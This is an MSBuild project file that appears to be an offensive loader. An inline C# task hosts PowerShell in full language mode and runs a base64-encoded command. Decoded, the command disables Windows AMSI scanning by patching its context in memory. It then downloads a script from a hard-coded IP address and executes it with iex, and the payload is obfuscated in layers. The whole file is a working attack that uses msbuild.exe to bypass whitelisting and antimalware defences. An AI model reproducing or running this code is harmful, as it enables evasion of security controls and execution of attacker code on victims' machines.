<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe powaShell.csproj -->
  <Target Name="Hello">
   <ClassExample />
  </Target>
    <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
     <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
     <!-- Your PowerShell Path May vary -->
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System;
            using System.Reflection;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            
            using System.Collections.ObjectModel;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using System.Text;
                
            public class ClassExample :  Task, ITask
            {
                public override bool Execute()
                {
                    runner.RunMahStuff();
                    return true;
                }
            }

            public class runner
            {
                public static string RunMahStuff()
                {
                    InitialSessionState iss = InitialSessionState.CreateDefault();
                    iss.LanguageMode = PSLanguageMode.FullLanguage;
                    
                    Console.WriteLine(System.Management.Automation.Security.SystemPolicy.GetSystemLockdownPolicy());
                    byte[] data = Convert.FromBase64String("aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZyhbY2hhcltdXUAoMzYsIDk3LCA2MSwgOTEsIDgyLCAxMDEsIDEwMiwgOTMsIDQ2LCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDQ2LCA3MSwgMTAxLCAxMTYsIDg0LCAxMjEsIDExMiwgMTAxLCAxMTUsIDQwLCA0MSwgNTksIDcwLCAxMTEsIDExNCwgNjksIDk3LCA5OSwgMTA0LCA0MCwgMzYsIDk4LCAzMiwgMTA1LCAxMTAsIDMyLCAzNiwgOTcsIDQxLCAzMiwgMTIzLCAxMDUsIDEwMiwgMzIsIDQwLCAzNiwgOTgsIDQ2LCA3OCwgOTcsIDEwOSwgMTAxLCAzMiwgNDUsIDEwOCwgMTA1LCAxMDcsIDEwMSwgMzIsIDM5LCA0MiwgMTA1LCA4NSwgMTE2LCAxMDUsIDEwOCwgMTE1LCAzOSwgNDEsIDMyLCAxMjMsIDM2LCA5OSwgNjEsIDM2LCA5OCwgMTI1LCAxMjUsIDU5LCAzNiwgMTAwLCA2MSwgMzYsIDk5LCA0NiwgNzEsIDEwMSwgMTE2LCA3MCwgMTA1LCAxMDEsIDEwOCwgMTAwLCAxMTUsIDQwLCAzOSwgNzgsIDExMSwgMTEwLCA4MCwgMTE3LCA5OCwgMTA4LCAxMDUsIDk5LCA0NCwgODMsIDExNiwgOTcsIDExNiwgMTA1LCA5OSwgMzksIDQxLCA1OSwgNzAsIDExMSwgMTE0LCA2OSwgOTcsIDk5LCAxMDQsIDQwLCAzNiwgMTAxLCAzMiwgMTA1LCAxMTAsIDMyLCAzNiwgMTAwLCA0MSwgMzIsIDEyMywgMTA1LCAxMDIsIDMyLCA0MCwgMzYsIDEwMSwgNDYsIDc4LCA5NywgMTA5LCAxMDEsIDMyLCA0NSwgMTA4LCAxMDUsIDEwNywgMTAxLCAzMiwgMzksIDQyLCA2NywgMTExLCAxMTAsIDExNiwgMTAxLCAxMjAsIDExNiwgMzksIDQxLCAzMiwgMTIzLCAzNiwgMTAyLCA2MSwgMzYsIDEwMSwgMTI1LCAxMjUsIDU5LCAzNiwgMTAzLCA2MSwgMzYsIDEwMiwgNDYsIDcxLCAxMDEsIDExNiwgODYsIDk3LCAxMDgsIDExNywgMTAxLCA0MCwgMzYsIDExMCwgMTE3LCAxMDgsIDEwOCwgNDEsIDU5LCA5MSwgNzMsIDExMCwgMTE2LCA4MCwgMTE2LCAxMTQsIDkzLCAzNiwgMTEyLCAxMTYsIDExNCwgNjEsIDM2LCAxMDMsIDU5LCA5MSwgNzMsIDExMCwgMTE2LCA1MSwgNTAsIDkxLCA5MywgOTMsIDM2LCA5OCwgMTE3LCAxMDIsIDYxLCA2NCwgNDAsIDQ4LCA0MSwgNTksIDkxLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNDYsIDczLCAxMTAsIDExNiwgMTAxLCAxMTQsIDExMSwgMTEyLCA4MywgMTAxLCAxMTQsIDExOCwgMTA1LCA5OSwgMTAxLCAxMTUsIDQ2LCA3NywgOTcsIDExNCwgMTE1LCAxMDQsIDk3LCAxMDgsIDkzLCA1OCwgNTgsIDY3LCAxMTEsIDExMiwgMTIxLCA0MCwgMzYsIDk4LCAxMTcsIDEwMiwgNDQsIDMyLCA0OCwgNDQsIDMyLCAzNiwgMTEyLCAxMTYsIDExNCwgNDQsIDMyLCA0OSwgNDEsIDU5LCAzNiwgMTE5LCA5OSwgMzIsIDYxLCAzMiwgNDAsIDExMCwgMTAxLCAxMTksIDQ1LCAxMTEsIDk4LCAxMDYsIDEwMSwgOTksIDExNiwgMzIsIDExNSwgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCAxMTAsIDEwMSwgMTE2LCA0NiwgMTE5LCAxMDEsIDk4LCA5OSwgMTA4LCAxMDUsIDEwMSwgMTEwLCAxMTYsIDQxLCA1OSwgMzYsIDExOSwgOTksIDQ2LCAxMDQsIDEwMSwgOTcsIDEwMCwgMTAxLCAxMTQsIDExNSwgNDYsIDk3LCAxMDAsIDEwMCwgNDAsIDM5LCA4NSwgMTE1LCAxMDEsIDExNCwgNDUsIDY1LCAxMDMsIDEwMSwgMTEwLCAxMTYsIDM5LCA0NCwgMzksIDc3LCAxMTEsIDEyMiwgMTA1LCAxMDgsIDEwOCwgOTcsIDQ3LCA1MywgNDYsIDQ4LCAzMiwgNDAsIDg3LCAxMDUsIDExMCwgMTAwLCAxMTEsIDExOSwgMTE1LCAzMiwgNzgsIDg0LCAzMiwgNDksIDQ4LCA0NiwgNDgsIDU5LCAzMiwgODQsIDExNCwgMTA1LCAxMDAsIDEwMSwgMTEwLCAxMTYsIDQ3LCA1NSwgNDYsIDQ4LCA1OSwgMzIsIDExNCwgMTE4LCA1OCwgNDksIDQ5LCA0NiwgNDgsIDQxLCAzMiwgMTA4LCAxMDUsIDEwNywgMTAxLCAzMiwgNzEsIDEwMSwgOTksIDEwNywgMTExLCAzOSwgNDEsIDU5LCAxMDUsIDEwMSwgMTIwLCA0MCwgMzYsIDExOSwgOTksIDQ2LCAxMDAsIDExMSwgMTE5LCAxMTAsIDEwOCwgMTExLCA5NywgMTAwLCAxMTUsIDExNiwgMTE0LCAxMDUsIDExMCwgMTAzLCA0MCwgMzksIDEwNCwgMTE2LCAxMTYsIDExMiwgNTgsIDQ3LCA0NywgNDksIDU3LCA1MCwgNDYsIDQ5LCA1NCwgNTYsIDQ2LCA0OSwgNTEsIDUzLCA0NiwgNTUsIDQ3LCAxMTcsIDExMiwgNDYsIDExNiwgMTIwLCAxMTYsIDM5LCA0MSwgNDEpKSk=");
                    string command = Encoding.UTF8.GetString(data);
                    
                    Runspace rs = RunspaceFactory.CreateRunspace(iss);
                    rs.Open();
                    PowerShell ps = PowerShell.Create();
                    ps.Runspace = rs;
                    ps.AddScript(command);
                    ps.Invoke();
                    rs.Close();

                    String something = "something";

                    return something;     
                }
            }
                            
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>